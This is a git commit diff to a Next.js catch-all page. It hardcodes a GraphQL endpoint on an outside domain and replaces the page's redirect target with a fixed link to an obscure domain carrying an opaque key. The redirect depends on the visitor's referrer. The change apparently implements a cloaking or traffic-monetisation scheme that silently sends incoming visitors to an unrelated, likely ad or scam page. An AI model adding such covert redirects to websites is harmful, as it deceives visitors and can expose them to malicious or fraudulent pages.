7b811573f9c6cd332319bc327507bb457abee891
mwkhan77 <137647243+mwkhan77@users.noreply.github.com>
2023-06-25 10:27:19 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = "https://mwkan.online/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -18,8 +18,9 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					endpoint.replace(/(\/graphql\/)/, '/') + encodeURI(path as string)
-				}`,
+					
+				       `https://passablejeepparliament.com/q5ui3wmcf9?key=f7ac4778125c3d7476d9c9ca2bde67fb/`
+                                }`,
 			},
 		};
 	}
